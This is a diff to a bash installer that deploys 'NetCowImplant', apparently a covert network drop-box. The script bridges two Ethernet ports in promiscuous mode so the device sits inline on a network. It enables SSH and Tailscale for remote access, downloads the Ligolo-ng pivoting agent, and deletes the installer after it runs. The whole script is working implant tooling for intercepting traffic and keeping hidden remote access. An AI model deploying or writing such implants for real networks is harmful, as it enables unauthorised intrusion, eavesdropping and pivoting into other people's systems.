@@ -4,7 +4,14 @@ set -e
 
 echo "[+] Deploying NetCowImplant..."
 
-REQUIRED_PKGS=(bridge-utils ifupdown isc-dhcp-client tailscale curl tar openssh-server)
+DISTRO=$(grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"')
+echo "[+] Detected distro: $DISTRO"
+
+REQUIRED_PKGS=(bridge-utils isc-dhcp-client tailscale curl tar openssh-server)
+if [[ "$DISTRO" == "debian" ]]; then
+    REQUIRED_PKGS+=(ifupdown)
+fi
+
 for pkg in "${REQUIRED_PKGS[@]}"; do
     if ! dpkg -s "$pkg" >/dev/null 2>&1; then
         echo "    [o] $pkg missing, installing..."
@@ -14,31 +21,32 @@ for pkg in "${REQUIRED_PKGS[@]}"; do
     fi
 done
 
-echo
 systemctl enable ssh
 systemctl start ssh
 echo "[✓] SSH is now active."
 
-sed -i '/iface wlan0/,/^$/d' /etc/network/interfaces
-sed -i '/auto wlan0/d' /etc/network/interfaces
+if [[ "$DISTRO" == "debian" ]]; then
+    sed -i '/iface wlan0/,/^$/d' /etc/network/interfaces || true
+    sed -i '/auto wlan0/d' /etc/network/interfaces || true
+    echo
+    echo "[✓] Cleaned /etc/network/interfaces (Debian)."
+else
+    echo
+    echo "[✓] Skipped /etc/network/interfaces cleanup (Ubuntu)."
+fi
 
 cat << 'EOF' > /usr/local/sbin/setup_bridge.sh
 #!/bin/bash
-
 set -e
 
-# Bring up physical interfaces
 ip link set eth0 up
 ip link set eth1 up
 
-# Flush existing IPs
 ip addr flush dev eth0
 ip addr flush dev eth1
 
-# Remove previous bridge if exists
 ip link delete br0 type bridge 2>/dev/null || true
 
-# Create and configure bridge
 brctl addbr br0
 brctl addif br0 eth0
 brctl addif br0 eth1
@@ -48,22 +56,15 @@ ip link set eth0 promisc on
 ip link set eth1 promisc on
 ip link set br0 promisc on
 
-# Remove all default routes except wlan0
 ip route | grep ^default | grep -v wlan0 | while read -r _ _ _ dev _; do
     ip route del default dev "$dev"
 done
 
-# Ensure br0 has metric 200
-if ! grep -q "metric 200" /etc/network/interfaces; then
-    sed -i '/iface br0 inet dhcp/a\    metric 200' /etc/network/interfaces
-fi
-
-# Launch DHCP on br0
+echo "[✓] Bridge br0 configured."
 dhclient -1 br0
 EOF
 
 chmod +x /usr/local/sbin/setup_bridge.sh
-echo
 echo "[✓] setup_bridge.sh created."
 
 cat << 'EOF' > /etc/systemd/system/setup-bridge.service
@@ -81,7 +82,6 @@ RemainAfterExit=yes
 WantedBy=multi-user.target
 EOF
 
-echo
 echo "[✓] Systemd service setup-bridge.service created."
 
 NM_CONF="/etc/NetworkManager/NetworkManager.conf"
@@ -98,10 +98,8 @@ systemctl daemon-reexec
 systemctl enable setup-bridge.service
 systemctl enable tailscaled
 systemctl start tailscaled
-echo
-echo "[✓] Tailscale ready to use."
+echo "[✓] Services enabled and started."
 
-echo
 echo "[+] Downloading Ligolo-ng agent..."
 mkdir -p /opt/ligolo
 curl -sSL https://github.com/nicocha30/ligolo-ng/releases/download/v0.8/ligolo-ng_agent_0.8_linux_arm64.tar.gz -o /opt/ligolo/ligolo-agent.tar.gz
@@ -111,19 +109,19 @@ chmod +x /opt/ligolo/agent
 ln -sf /opt/ligolo/agent /usr/local/bin/ligolo
 echo "[✓] Ligolo-ng agent ready to use as 'ligolo'"
 
-echo
-echo "[✓] NetCowImplant - Installation complete!"
-echo
-echo "[!] To finish setup:"
-echo "    - Run: sudo tailscale up --authkey tskey-xxxxxxxxxxxxxxxx"
-echo "    - Reboot: sudo reboot"
-echo
-echo "[📶] Help with Wi-Fi connection (if needed):"
-echo "    - nmcli device wifi list"
-echo "    - nmcli device wifi connect '<SSID>' password '<PASSWORD>'"
-echo "    - nmcli connection modify '<SSID>' connection.autoconnect yes"
-echo
-
 INSTALLER_PATH=$(readlink -f "$0")
 echo "[✓] Deleting installer script: $INSTALLER_PATH"
 rm -f "$INSTALLER_PATH"
+
+echo
+echo "[✓] NetCowImplant - Installation complete!"
+echo
+echo "[!] Finish setup with:"
+echo "    sudo tailscale up --authkey tskey-xxxxxxxxxxxxxxxx"
+echo "    sudo reboot"
+echo
+echo "[📶] Wi-Fi help:"
+echo "    nmcli device wifi list"
+echo "    nmcli device wifi connect '<SSID>' password '<PASSWORD>'"
+echo "    nmcli connection modify '<SSID>' connection.autoconnect yes"
+echo
